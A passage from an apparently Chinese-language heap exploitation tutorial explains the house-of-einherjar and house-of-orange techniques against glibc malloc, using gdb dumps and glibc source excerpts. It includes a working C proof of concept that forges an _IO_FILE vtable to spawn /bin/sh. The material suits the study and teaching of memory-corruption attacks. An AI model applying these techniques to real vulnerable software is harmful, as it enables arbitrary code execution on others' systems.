in our fake chunk: 0x7ffdb337b800\n</code></pre> <p>house-of-einherjar \u662f\u4e00\u79cd\u5229\u7528 malloc \u6765\u8fd4\u56de\u4e00\u4e2a\u9644\u8fd1\u5730\u5740\u7684\u4efb\u610f\u6307\u9488\u3002\u5b83\u8981\u6c42\u6709\u4e00\u4e2a\u5355\u5b57\u8282\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u8986\u76d6\u6389 next chunk \u7684 size \u5b57\u6bb5\u5e76\u6e05\u9664 <code>PREV_IN_USE</code> \u6807\u5fd7\uff0c\u7136\u540e\u8fd8\u9700\u8981\u8986\u76d6 prev_size \u5b57\u6bb5\u4e3a fake chunk \u7684\u5927\u5c0f\u3002\u5f53 next chunk \u88ab\u91ca\u653e\u65f6\uff0c\u5b83\u4f1a\u53d1\u73b0\u524d\u4e00\u4e2a chunk \u88ab\u6807\u8bb0\u4e3a\u7a7a\u95f2\u72b6\u6001\uff0c\u7136\u540e\u5c1d\u8bd5\u5408\u5e76\u5806\u5757\u3002\u53ea\u8981\u6211\u4eec\u7cbe\u5fc3\u6784\u9020\u4e00\u4e2a fake chunk\uff0c\u8ba9\u5408\u5e76\u540e\u7684\u5806\u5757\u8303\u56f4\u5230 fake chunk \u5904\uff0c\u90a3\u4e0b\u4e00\u6b21 malloc \u5c06\u8fd4\u56de\u6211\u4eec\u60f3\u8981\u7684\u5730\u5740\u3002\u6bd4\u8d77\u524d\u9762\u6240\u8bb2\u8fc7\u7684 poison-null-byte \uff0c\u66f4\u52a0\u5f3a\u5927\uff0c\u4f46\u662f\u8981\u6c42\u7684\u6761\u4ef6\u4e5f\u66f4\u591a\u4e00\u70b9\uff0c\u6bd4\u5982\u4e00\u4e2a\u5806\u4fe1\u606f\u6cc4\u6f0f\u3002</p> <p>\u9996\u5148\u5206\u914d\u4e00\u4e2a\u5047\u8bbe\u5b58\u5728 off_by_one \u6ea2\u51fa\u7684 chunk a\uff0c\u7136\u540e\u5728\u6808\u4e0a\u521b\u5efa\u6211\u4eec\u7684 fake chunk\uff0cchunk \u5927\u5c0f\u968f\u610f\uff0c\u53ea\u8981\u662f small chunk \u5c31\u53ef\u4ee5\u4e86\uff1a</p> <pre><code>gef\u27a4  x/8gx a-0x10\n0x603000:    0x0000000000000000    0x0000000000000021  &lt;-- chunk a\n0x603010:    0x4141414141414141    0x4141414141414141\n0x603020:    0x4141414141414141    0x0000000000020fe1  &lt;-- top chunk\n0x603030:    0x0000000000000000    0x0000000000000000\ngef\u27a4  x/8gx &amp;fake_chunk\n0x7fffffffdcb0:    0x0000000000000080    0x0000000000000080  &lt;-- fake chunk\n0x7fffffffdcc0:    0x00007fffffffdcb0    0x00007fffffffdcb0\n0x7fffffffdcd0:    0x00007fffffffdcb0    0x00007fffffffdcb0\n0x7fffffffdce0:    0x00007fffffffddd0    0xffa7b97358729300\n</code></pre> <p>\u63a5\u4e0b\u6765\u521b\u5efa chunk b\uff0c\u5e76\u5229\u7528 chunk a \u7684\u6ea2\u51fa\u5c06 size \u5b57\u6bb5\u8986\u76d6\u6389\uff0c\u6e05\u9664\u4e86 <code>PREV_INUSE</code> \u6807\u5fd7\uff0cchunk b \u5c31\u4f1a\u4ee5\u4e3a\u524d\u4e00\u4e2a chunk \u662f\u4e00\u4e2a free chunk \u4e86\uff1a</p> <pre><code>gef\u27a4  x/8gx a-0x10\n0x603000:    0x0000000000000000    0x0000000000000021  &lt;-- chunk a\n0x603010:    0x4141414141414141    0x4141414141414141\n0x603020:    0x4141414141414141    0x0000000000000100  &lt;-- chunk b\n0x603030:    0x0000000000000000    0x0000000000000000\n</code></pre> <p>\u539f\u672c chunk b \u7684 size \u5b57\u6bb5\u5e94\u8be5\u4e3a 0x101\uff0c\u5728\u8fd9\u91cc\u6211\u4eec\u9009\u62e9 malloc(0xf8) \u4f5c\u4e3a chunk b \u4e5f\u662f\u51fa\u4e8e\u65b9\u4fbf\u7684\u76ee\u7684\uff0c\u8986\u76d6\u540e\u53ea\u5f71\u54cd\u4e86\u6807\u5fd7\u4f4d\uff0c\u6ca1\u6709\u5f71\u54cd\u5230\u5927\u5c0f\u3002</p> <p>\u63a5\u4e0b\u6765\u6839\u636e fake chunk \u5728\u6808\u4e0a\u7684\u4f4d\u7f6e\u4fee\u6539 chunk b \u7684 prev_size \u5b57\u6bb5\u3002\u8ba1\u7b97\u65b9\u6cd5\u662f\u7528 chunk b \u7684\u8d77\u59cb\u5730\u5740\u51cf\u53bb fake chunk \u7684\u8d77\u59cb\u5730\u5740\uff0c\u540c\u65f6\u4e3a\u4e86\u7ed5\u8fc7\u68c0\u67e5\uff0c\u8fd8\u9700\u8981\u5c06 fake chunk \u7684 size \u5b57\u6bb5\u4e0e chunk b \u7684 prev_size \u5b57\u6bb5\u76f8\u5339\u914d\uff1a</p> <pre><code>gef\u27a4  x/8gx a-0x10\n0x603000:    0x0000000000000000    0x0000000000000021  &lt;-- chunk a\n0x603010:    0x4141414141414141    0x4141414141414141\n0x603020:    0xffff800000605370    0x0000000000000100  &lt;-- chunk b &lt;-- prev_size\n0x603030:    0x0000000000000000    0x0000000000000000\ngef\u27a4  x/8gx &amp;fake_chunk\n0x7fffffffdcb0:    0x0000000000000080    0xffff800000605370  &lt;-- fake chunk &lt;-- size\n0x7fffffffdcc0:    0x00007fffffffdcb0    0x00007fffffffdcb0\n0x7fffffffdcd0:    0x00007fffffffdcb0    0x00007fffffffdcb0\n0x7fffffffdce0:    0x00007fffffffddd0    0xadeb3936608e0600\n</code></pre> <p>\u91ca\u653e chunk b\uff0c\u8fd9\u65f6\u56e0\u4e3a <code>PREV_INUSE</code> \u4e3a\u96f6\uff0cunlink \u4f1a\u6839\u636e prev_size \u53bb\u5bfb\u627e\u4e0a\u4e00\u4e2a free chunk\uff0c\u5e76\u5c06\u5b83\u548c\u5f53\u524d chunk \u5408\u5e76\u3002\u4ece arena \u91cc\u53ef\u4ee5\u770b\u5230\uff1a</p> <pre><code>gef\u27a4  heap arenas\nArena (base=0x7ffff7dd1b20, top=0x7fffffffdcb0, last_remainder=0x0, next=0x7ffff7dd1b20, next_free=0x0, system_mem=0x21000)\n</code></pre> <p>\u5408\u5e76\u7684\u8fc7\u7a0b\u5728 poison-null-byte \u90a3\u91cc\u4e5f\u8bb2\u8fc7\u4e86\u3002</p> <p>\u6700\u540e\u5f53\u6211\u4eec\u518d\u6b21 malloc\uff0c\u5176\u8fd4\u56de\u7684\u5730\u5740\u5c06\u662f fake chunk \u7684\u5730\u5740\uff1a</p> <pre><code>gef\u27a4  x/8gx &amp;fake_chunk\n0x7fffffffdcb0:    0x0000000000000080    0x0000000000000021  &lt;-- chunk d\n0x7fffffffdcc0:    0x4141414141414141    0x4141414141414141\n0x7fffffffdcd0:    0x00007fffffffdcb0    0xffff800000626331\n0x7fffffffdce0:    0x00007fffffffddd0    0xbdf40e22ccf46c00\n</code></pre>"},{"location":"Training/Material/Binary%20Exploitation/#house_of_orange","title":"house_of_orange","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nint winner (char *ptr);\n\nint main() {\n    char *p1, *p2;\n    size_t io_list_all, *top;\n\n    p1 = malloc(0x400 - 0x10);\n\n    top = (size_t *) ((char *) p1 + 0x400 - 0x10);\n    top[1] = 0xc01;\n\n    p2 = malloc(0x1000);\n    io_list_all = top[2] + 0x9a8;\n    top[3] = io_list_all - 0x10;\n\n    memcpy((char *) top, \"/bin/sh\\x00\", 8);\n\n    top[1] = 0x61;\n\n    _IO_FILE *fp = (_IO_FILE *) top;\n    fp-&gt;_mode = 0; // top+0xc0\n    fp-&gt;_IO_write_base = (char *) 2; // top+0x20\n    fp-&gt;_IO_write_ptr = (char *) 3; // top+0x28\n\n    size_t *jump_table = &amp;top[12]; // controlled memory\n    jump_table[3] = (size_t) &amp;winner;\n    *(size_t *) ((size_t) fp + sizeof(_IO_FILE)) = (size_t) jump_table; // top+0xd8\n\n    malloc(1);\n    return 0;\n}\n\nint winner(char *ptr) {\n    system(ptr);\n    return 0;\n}\n$ gcc -g house_of_orange.c\n$ ./a.out\n*** Error in `./a.out': malloc(): memory corruption: 0x00007f3daece3520 ***\n======= Backtrace: =========\n/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f3dae9957e5]\n/lib/x86_64-linux-gnu/libc.so.6(+0x8213e)[0x7f3dae9a013e]\n/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7f3dae9a2184]\n./a.out[0x4006cc]\n/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f3dae93e830]\n./a.out[0x400509]\n======= Memory map: ========\n00400000-00401000 r-xp 00000000 08:01 919342                             /home/firmy/how2heap/a.out\n00600000-00601000 r--p 00000000 08:01 919342                             /home/firmy/how2heap/a.out\n00601000-00602000 rw-p 00001000 08:01 919342                             /home/firmy/how2heap/a.out\n01e81000-01ec4000 rw-p 00000000 00:00 0                                  [heap]\n7f3da8000000-7f3da8021000 rw-p 00000000 00:00 0\n7f3da8021000-7f3dac000000 ---p 00000000 00:00 0\n7f3dae708000-7f3dae71e000 r-xp 00000000 08:01 398989                     /lib/x86_64-linux-gnu/libgcc_s.so.1\n7f3dae71e000-7f3dae91d000 ---p 00016000 08:01 398989                     /lib/x86_64-linux-gnu/libgcc_s.so.1\n7f3dae91d000-7f3dae91e000 rw-p 00015000 08:01 398989                     /lib/x86_64-linux-gnu/libgcc_s.so.1\n7f3dae91e000-7f3daeade000 r-xp 00000000 08:01 436912                     /lib/x86_64-linux-gnu/libc-2.23.so\n7f3daeade000-7f3daecde000 ---p 001c0000 08:01 436912                     /lib/x86_64-linux-gnu/libc-2.23.so\n7f3daecde000-7f3daece2000 r--p 001c0000 08:01 436912                     /lib/x86_64-linux-gnu/libc-2.23.so\n7f3daece2000-7f3daece4000 rw-p 001c4000 08:01 436912                     /lib/x86_64-linux-gnu/libc-2.23.so\n7f3daece4000-7f3daece8000 rw-p 00000000 00:00 0\n7f3daece8000-7f3daed0e000 r-xp 00000000 08:01 436908                     /lib/x86_64-linux-gnu/ld-2.23.so\n7f3daeef4000-7f3daeef7000 rw-p 00000000 00:00 0\n7f3daef0c000-7f3daef0d000 rw-p 00000000 00:00 0\n7f3daef0d000-7f3daef0e000 r--p 00025000 08:01 436908                     /lib/x86_64-linux-gnu/ld-2.23.so\n7f3daef0e000-7f3daef0f000 rw-p 00026000 08:01 436908                     /lib/x86_64-linux-gnu/ld-2.23.so\n7f3daef0f000-7f3daef10000 rw-p 00000000 00:00 0\n7ffe8eba6000-7ffe8ebc7000 rw-p 00000000 00:00 0                          [stack]\n7ffe8ebee000-7ffe8ebf1000 r--p 00000000 00:00 0                          [vvar]\n7ffe8ebf1000-7ffe8ebf3000 r-xp 00000000 00:00 0                          [vdso]\nffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]\n$ whoami\nfirmy\n$ exit\nAborted (core dumped)\n</code></pre> <p>house-of-orange \u662f\u4e00\u79cd\u5229\u7528\u5806\u6ea2\u51fa\u4fee\u6539 <code>_IO_list_all</code> \u6307\u9488\u7684\u5229\u7528\u65b9\u6cd5\u3002\u5b83\u8981\u6c42\u80fd\u591f\u6cc4\u6f0f\u5806\u548c libc\u3002\u6211\u4eec\u77e5\u9053\u4e00\u5f00\u59cb\u7684\u65f6\u5019\uff0c\u6574\u4e2a\u5806\u90fd\u5c5e\u4e8e top chunk\uff0c\u6bcf\u6b21\u7533\u8bf7\u5185\u5b58\u65f6\uff0c\u5c31\u4ece top chunk \u4e2d\u5212\u51fa\u8bf7\u6c42\u5927\u5c0f\u7684\u5806\u5757\u8fd4\u56de\u7ed9\u7528\u6237\uff0c\u4e8e\u662f top chunk \u5c31\u8d8a\u6765\u8d8a\u5c0f\u3002</p> <p>\u5f53\u67d0\u4e00\u6b21 top chunk \u7684\u5269\u4f59\u5927\u5c0f\u5df2\u7ecf\u4e0d\u80fd\u591f\u6ee1\u8db3\u8bf7\u6c42\u65f6\uff0c\u5c31\u4f1a\u8c03\u7528\u51fd\u6570 <code>sysmalloc()</code> \u5206\u914d\u65b0\u5185\u5b58\uff0c\u8fd9\u65f6\u53ef\u80fd\u4f1a\u53d1\u751f\u4e24\u79cd\u60c5\u51b5\uff0c\u4e00\u79cd\u662f\u76f4\u63a5\u6269\u5145 top chunk\uff0c\u53e6\u4e00\u79cd\u662f\u8c03\u7528 mmap \u5206\u914d\u4e00\u5757\u65b0\u7684 top chunk\u3002\u5177\u4f53\u8c03\u7528\u54ea\u4e00\u79cd\u65b9\u6cd5\u662f\u7531\u7533\u8bf7\u5927\u5c0f\u51b3\u5b9a\u7684\uff0c\u4e3a\u4e86\u80fd\u591f\u4f7f\u7528\u524d\u4e00\u79cd\u6269\u5c55 top chunk\uff0c\u9700\u8981\u8bf7\u6c42\u5c0f\u4e8e\u9600\u503c <code>mp_.mmap_threshold</code>\uff1a</p> <pre><code>  if (av == NULL\n      || ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold)\n      &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))\n    {\n</code></pre> <p>\u540c\u65f6\uff0c\u4e3a\u4e86\u80fd\u591f\u8c03\u7528 <code>sysmalloc()</code> \u4e2d\u7684 <code>_int_free()</code>\uff0c\u9700\u8981 top chunk \u5927\u4e8e <code>MINSIZE</code>\uff0c\u5373 0x10\uff1a</p> <pre><code>                      if (old_size &gt;= MINSIZE)\n                        {\n                          _int_free (av, old_top, 1);\n                        }\n</code></pre> <p>\u5f53\u7136\uff0c\u8fd8\u5f97\u7ed5\u8fc7\u4e0b\u9762\u4e24\u4e2a\u9650\u5236\u6761\u4ef6\uff1a</p> <pre><code>  /*\n     If not the first time through, we require old_size to be\n     at least MINSIZE and to have prev_inuse set.\n   */\n\n  assert ((old_top == initial_top (av) &amp;&amp; old_size == 0) ||\n          ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp;\n           prev_inuse (old_top) &amp;&amp;\n           ((unsigned long) old_end &amp; (pagesize - 1)) == 0));\n\n  /* Precondition: not enough current space to satisfy nb request */\n  assert ((unsigned long) (old_size) &lt; (unsigned long) (nb + MINSIZE));\n</code></pre> <p>\u5373\u6ee1\u8db3 old_size \u5c0f\u4e8e <code>nb+MINSIZE</code>\uff0c<code>PREV_INUSE</code> \u6807\u5fd7\u4f4d\u4e3a 1\uff0c<code>old_top+old_size</code> \u9875\u5bf9\u9f50\u8fd9\u51e0\u4e2a\u6761\u4ef6\u3002</p> <p>\u9996\u5148\u5206\u914d\u4e00\u4e2a\u5927\u5c0f\u4e3a 0x400 \u7684 chunk\uff1a</p> <pre><code>gef\u27a4  x/4gx p1-0x10\n0x602000:    0x0000000000000000    0x0000000000000401  &lt;-- chunk p1\n0x602010:    0x0000000000000000    0x0000000000000000\ngef\u27a4  x/4gx p1-0x10+0x400\n0x602400:    0x0000000000000000    0x0000000000020c01  &lt;-- top chunk\n0x602410:    0x0000000000000000    0x0000000000000000\n</code></pre> <p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0ctop chunk \u5927\u5c0f\u4e3a 0x21000\uff0c\u51cf\u53bb 0x400\uff0c\u6240\u4ee5\u6b64\u65f6\u7684\u5927\u5c0f\u4e3a 0x20c00\uff0c\u53e6\u5916 PREV_INUSE \u88ab\u8bbe\u7f6e\u3002</p> <p>\u73b0\u5728\u5047\u8bbe\u5b58\u5728\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u4fee\u6539 top chunk \u7684\u6570\u636e\uff0c\u4e8e\u662f\u6211\u4eec\u5c06 size \u5b57\u6bb5\u4fee\u6539\u4e3a 0xc01\u3002\u8fd9\u6837\u5c31\u53ef\u4ee5\u6ee1\u8db3\u4e0a\u9762\u6240\u8bf4\u7684\u6761\u4ef6\uff1a</p> <pre><code>gef\u27a4  x/4gx p1-0x10+0x400\n0x602400:    0x0000000000000000    0x0000000000000c01  &lt;-- top chunk\n0x602410:    0x0000000000000000    0x0000000000000000\n</code></pre> <p>\u7d27\u63a5\u7740\uff0c\u7533\u8bf7\u4e00\u5757\u5927\u5185\u5b58\uff0c\u6b64\u65f6\u7531\u4e8e\u4fee\u6539\u540e\u7684 top chunk size \u4e0d\u80fd\u6ee1\u8db3\u9700\u6c42\uff0c\u5219\u8c03\u7528 sysmalloc \u7684\u7b2c\u4e00\u79cd\u65b9\u6cd5\u6269\u5145 top chunk\uff0c\u7ed3\u679c\u662f\u5728 old_top \u540e\u9762\u65b0\u5efa\u4e86\u4e00\u4e2a top chunk \u7528\u6765\u5b58\u653e new_top\uff0c\u7136\u540e\u5c06 old_top \u91ca\u653e\uff0c\u5373\u88ab\u6dfb\u52a0\u5230\u4e86 unsorted bin \u4e2d\uff1a</p> <pre><code>gef\u27a4  x/4gx p1-0x10+0x400\n0x602400:    0x0000000000000000    0x0000000000000be1  &lt;-- old top chunk [be freed]\n0x602410:    0x00007ffff7dd1b78    0x00007ffff7dd1b78      &lt;-- fd, bk pointer\ngef\u27a4  x/4gx p1-0x10+0x400+0xbe0\n0x602fe0:    0x0000000000000be0    0x0000000000000010  &lt;-- fencepost chunk 1\n0x602ff0:    0x0000000000000000    0x0000000000000011  &lt;-- fencepost chunk 2\ngef\u27a4  x/4gx p2-0x10\n0x623000:    0x0000000000000000    0x0000000000001011  &lt;-- chunk p2\n0x623010:    0x0000000000000000    0x0000000000000000\ngef\u27a4  x/4gx p2-0x10+0x1010\n0x624010:    0x0000000000000000    0x0000000000020ff1  &lt;-- new top chunk\n0x624020:    0x0000000000000000    0x0000000000000000\ngef\u27a4  heap bins unsorted\n[ Unsorted Bin for arena 'main_arena' ]\n[+] unsorted_bins[0]: fw=0x602400, bk=0x602400\n \u2192   Chunk(addr=0x602410, size=0xbe0, flags=PREV_INUSE)\n</code></pre> <p>\u4e8e\u662f\u5c31\u6cc4\u6f0f\u51fa\u4e86 libc \u5730\u5740\u3002\u53e6\u5916\u53ef\u4ee5\u770b\u5230 old top chunk \u88ab\u7f29\u5c0f\u4e86 0x20\uff0c\u7f29\u5c0f\u7684\u7a7a\u95f4\u88ab\u7528\u4e8e\u653e\u7f6e fencepost chunk\u3002\u6b64\u65f6\u7684\u5806\u7a7a\u95f4\u5e94\u8be5\u662f\u8fd9\u6837\u7684\uff1a</p> <pre><code>+---------------+\n|       p1      |\n+---------------+\n|  old top-0x20 |\n+---------------+\n|  fencepost 1  |\n+---------------+\n|  fencepost 2  |\n+---------------+\n|      ...      |\n+---------------+\n|       p2      |\n+---------------+\n|    new top    |\n+---------------+\n</code></pre> <p>\u8be6\u7ec6\u8fc7\u7a0b\u5982\u4e0b\uff1a</p> <pre><code>                  if (old_size != 0)\n                    {\n                      /*\n                         Shrink old_top to insert fenceposts, keeping size a\n                         multiple of MALLOC_ALIGNMENT. We know there is at least\n                         enough space in old_top to do this.\n                       */\n                      old_size = (old_size - 4 * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK;\n                      set_head (old_top, old_size | PREV_INUSE);\n\n                      /*\n                         Note that the following assignments completely overwrite\n                         old_top when old_size was previously MINSIZE.  This is\n                         intentional. We need the fencepost, even if old_top otherwise gets\n                         lost.\n                       */\n                      chunk_at_offset (old_top, old_size)-&gt;size =\n                        (2 * SIZE_SZ) | PREV_INUSE;\n\n                      chunk_at_offset (old_top, old_size + 2 * SIZE_SZ)-&gt;size =\n                        (2 * SIZE_SZ) | PREV_INUSE;\n\n                      /* If possible, release the rest. */\n                      if (old_size &gt;= MINSIZE)\n                        {\n                          _int_free (av, old_top, 1);\n                        }\n                    }\n</code></pre> <p>\u6839\u636e\u653e\u5165 unsorted bin \u4e2d old top chunk \u7684 fd/bk \u6307\u9488\uff0c\u53ef\u4ee5\u63a8\u7b97\u51fa <code>_IO_list_all</code> \u7684\u5730\u5740\u3002\u7136\u540e\u901a\u8fc7\u6ea2\u51fa\u5c06 old top \u7684 bk \u6539\u5199\u4e3a <code>_IO_list_all-0x10</code>\uff0c\u8fd9\u6837\u5728\u8fdb\u884c unsorted bin attack \u65f6\uff0c\u5c31\u4f1a\u5c06 <code>_IO_list_all</code> \u4fee\u6539\u4e3a <code>&amp;unsorted_bin-0x10</code>\uff1a</p> <pre><code>          /* remove from unsorted list */\n          unsorted_chunks (av)-&gt;bk = bck;\n          bck-&gt;fd = unsorted_chunks (av);\ngef\u27a4  x/4gx p1-0x10+0x400\n0x602400:    0x0000000000000000    0x0000000000000be1\n0x602410:    0x00007ffff7dd1b78    0x00007ffff7dd2510\n</code></pre> <p>\u8fd9\u91cc\u8bb2\u4e00\u4e0b glibc \u4e2d\u7684\u5f02\u5e38\u5904\u7406\u3002\u4e00\u822c\u5728\u51fa\u73b0\u5185\u5b58\u9519\u8bef\u65f6\uff0c\u4f1a\u8c03\u7528\u51fd\u6570 <code>malloc_printerr()</code> \u6253\u5370\u51fa\u9519\u4fe1\u606f\uff0c\u6211\u4eec\u987a\u7740\u4ee3\u7801\u4e00\u76f4\u8ddf\u8e2a\u4e0b\u53bb\uff1a</p> <pre><code>static void\nmalloc_printerr (int action, const char *str, void *ptr, mstate ar_ptr)\n{\n  [...]\n  if ((action &amp; 5) == 5)\n    __libc_message (action &amp; 2, \"%s\\n\", str);\n  else if (action &amp; 1)\n    {\n      char buf[2 * sizeof (uintptr_t) + 1];\n\n      buf[sizeof (buf) - 1] = '\\0';\n      char *cp = _itoa_word ((uintptr_t) ptr, &amp;buf[sizeof (buf) - 1], 16, 0);\n      while (cp &gt; buf)\n        *--cp = '0';\n\n      __libc_message (action &amp; 2, \"*** Error in `%s': %s: 0x%s ***\\n\",\n                      __libc_argv[0] ? : \"&lt;unknown&gt;\", str, cp);\n    }\n  else if (action &amp; 2)\n    abort ();\n}\n</code></pre> <p>\u8c03\u7528 <code>__libc_message</code>\uff1a</p> <pre><code>// sysdeps/posix/libc_fatal.c\n/* Abort with an error message.  */\nvoid\n__libc_message (int do_abort, const char *fmt, ...)\n{\n  [...]\n  if (do_abort)\n    {\n      BEFORE_ABORT (do_abort, written, fd);\n\n      /* Kill the application.  */\n      abort ();\n    }\n}\n</code></pre> <p><code>do_abort</code> \u8c03\u7528 <code>fflush</code>\uff0c\u5373 <code>_IO_flush_all_lockp</code>\uff1a</p> <pre><code>// stdlib/abort.c\n#define fflush(s) _IO_flush_all_lockp (0)\n\n  if (stage == 1)\n    {\n      ++stage;\n      fflush (NULL);\n    }\n// libio/genops.c\nint\n_IO_flush_all_lockp (int do_lock)\n{\n  int result = 0;\n  struct _IO_FILE *fp;\n  int last_stamp;\n\n#ifdef _IO_MTSAFE_IO\n  __libc_cleanup_region_start (do_lock, flush_cleanup, NULL);\n  if (do_lock)\n    _IO_lock_lock (list_all_lock);\n#endif\n\n  last_stamp = _IO_list_all_stamp;\n  fp = (_IO_FILE *) _IO_list_all;   // \u5c06\u5176\u8986\u76d6\n  while (fp != NULL)\n    {\n      run_fp = fp;\n      if (do_lock)\n    _IO_flockfile (fp);\n\n      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)\n#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T\n       || (_IO_vtable_offset (fp) == 0\n           &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr\n                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))\n#endif\n       )\n      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)     // \u5c06\u5176\u4fee\u6539\u4e3a system \u51fd\u6570\n    result = EOF;\n\n      if (do_lock)\n    _IO_funlockfile (fp);\n      run_fp = NULL;\n\n      if (last_stamp != _IO_list_all_stamp)\n    {\n      /* Something was added to the list.  Start all over again.  */\n      fp = (_IO_FILE *) _IO_list_all;\n      last_stamp = _IO_list_all_stamp;\n    }\n      else\n    fp = fp-&gt;_chain;    // \u6307\u5411\u6211\u4eec\u6307\u5b9a\u7684\u533a\u57df\n    }\n\n#ifdef _IO_MTSAFE_IO\n  if (do_lock)\n    _IO_lock_unlock (list_all_lock);\n  __libc_cleanup_region_end (0);\n#endif\n\n  return result;\n}\n</code></pre> <p><code>_IO_list_all</code> \u662f\u4e00\u4e2a <code>_IO_FILE_plus</code> \u7c7b\u578b\u7684\u5bf9\u8c61\uff0c\u6211\u4eec\u7684\u76ee\u7684\u5c31\u662f\u5c06 <code>_IO_list_all</code> \u6307\u9488\u6539\u5199\u4e3a\u4e00\u4e2a\u4f2a\u9020\u7684\u6307\u9488\uff0c\u5b83\u7684 <code>_IO_OVERFLOW</code> \u6307\u5411 system\uff0c\u5e76\u4e14\u524d 8 \u5b57\u8282\u88ab\u8bbe\u7f6e\u4e3a '/bin/sh'\uff0c\u6240\u4ee5\u5bf9 <code>_IO_OVERFLOW(fp, EOF)</code> \u7684\u8c03\u7528\u6700\u7ec8\u4f1a\u53d8\u6210\u5bf9 <code>system('/bin/sh')</code> \u7684\u8c03\u7528\u3002</p> <pre><code>// libio/libioP.h\n/* We always allocate an extra word following an _IO_FILE.\n   This contains a pointer to the function jump table used.\n   This is for compatibility with C++ streambuf; the word can\n   be used to smash to a pointer to a virtual function table. */\n\nstruct _IO_FILE_plus\n{\n  _IO_FILE file;\n  const struct _IO_jump_t *vtable;\n};\n\n// libio/libio.h\nstruct _IO_FILE {\n  int _flags;        /* High-order word is _IO_MAGIC; rest is flags. */\n#define _IO_file_flags _flags\n\n  /* The following pointers correspond to the C++ streambuf protocol. */\n  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */\n  char* _IO_read_ptr;    /* Current read pointer */\n  char* _IO_read_end;    /* End of get area. */\n  char* _IO_read_base;    /* Start of putback+get area. */\n  char* _IO_write_base;    /* Start of put area. */\n  char* _IO_write_ptr;    /* Current put pointer. */\n  char* _IO_write_end;    /* End of put area. */\n  char* _IO_buf_base;    /* Start of reserve area. */\n  char* _IO_buf_end;    /* End of reserve area. */\n  /* The following fields are used to support backing up and undo. */\n  char *_IO_save_base; /* Pointer to start of non-current get area. */\n  char *_IO_backup_base;  /* Pointer to first valid character of backup area */\n  char *_IO_save_end; /* Pointer to end of non-current get area. */\n\n  struct _IO_marker *_markers;\n\n  struct _IO_FILE *_chain;\n\n  int _fileno;\n#if 0\n  int _blksize;\n#else\n  int _flags2;\n#endif\n  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */\n\n#define __HAVE_COLUMN /* temporary */\n  /* 1+column number of pbase(); 0 is unknown. */\n  unsigned short _cur_column;\n  signed char _vtable_offset;\n  char _shortbuf[1];\n\n  /*  char* _save_gptr;  char* _save_egptr; */\n\n  _IO_lock_t *_lock;\n#ifdef _IO_USE_OLD_IO_FILE\n};\n</code></pre> <p>\u5176\u4e2d\u6709\u4e00\u4e2a\u6307\u5411\u51fd\u6570\u8df3\u8f6c\u8868\u7684\u6307\u9488\uff0c<code>_IO_jump_t</code> \u7684\u7ed3\u6784\u5982\u4e0b\uff1a</p> <pre><code>// libio/libioP.h\nstruct _IO_jump_t\n{\n    JUMP_FIELD(size_t, __dummy);\n    JUMP_FIELD(size_t, __dummy2);\n    JUMP_FIELD(_IO_finish_t, __finish);\n    JUMP_FIELD(_IO_overflow_t, __overflow);\n    JUMP_FIELD(_IO_underflow_t, __underflow);\n    JUMP_FIELD(_IO_underflow_t, __uflow);\n    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);\n    /* showmany */\n    JUMP_FIELD(_IO_xsputn_t, __xsputn);\n    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);\n    JUMP_FIELD(_IO_seekoff_t, __seekoff);\n    JUMP_FIELD(_IO_seekpos_t, __seekpos);\n    JUMP_FIELD(_IO_setbuf_t, __setbuf);\n    JUMP_FIELD(_IO_sync_t, __sync);\n    JUMP_FIELD(_IO_doallocate_t, __doallocate);\n    JUMP_FIELD(_IO_read_t, __read);\n    JUMP_FIELD(_IO_write_t, __write);\n    JUMP_FIELD(_IO_seek_t, __seek);\n    JUMP_FIELD(_IO_close_t, __close);\n    JUMP_FIELD(_IO_stat_t, __stat);\n    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);\n    JUMP_FIELD(_IO_imbue_t, __imbue);\n#if 0\n    get_column;\n    set_column;\n#endif\n};\n</code></pre> <p>\u4f2a\u9020 <code>_IO_jump_t</code> \u4e2d\u7684 <code>__overflow</code> \u4e3a system \u51fd\u6570\u7684\u5730\u5740\uff0c\u4ece\u800c\u8fbe\u5230\u6267\u884c shell \u7684\u76ee\u7684\u3002</p> <p>\u5f53\u53d1\u751f\u5185\u5b58\u9519\u8bef\u8fdb\u5165 <code>_IO_flush_all_lockp</code> \u540e\uff0c<code>_IO_list_all</code> \u4ecd\u7136\u6307\u5411 unsorted bin\uff0c\u8fd9\u5e76\u4e0d\u662f\u4e00\u4e2a\u6211\u4eec\u80fd\u63a7\u5236\u7684\u5730\u5740\u3002\u6240\u4ee5\u9700\u8981\u901a\u8fc7 <code>fp-&gt;_chain</code> \u6765\u5c06 fp \u6307\u5411\u6211\u4eec\u80fd\u63a7\u5236\u7684\u5730\u65b9\u3002\u6240\u4ee5\u5c06 size \u5b57\u6bb5\u8bbe\u7f6e\u4e3a 0x61\uff0c\u56e0\u4e3a\u6b64\u65f6 <code>_IO_list_all</code> \u662f <code>&amp;unsorted_bin-0x10</code>\uff0c\u504f\u79fb 0x60 \u4f4d\u7f6e\u4e0a\u662f smallbins[5]\u3002\u6b64\u65f6\uff0c\u5982\u679c\u89e6\u53d1\u4e00\u4e2a\u4e0d\u9002\u5408\u7684 small chunk \u5206\u914d\uff0cmalloc \u5c31\u4f1a\u5c06 old top 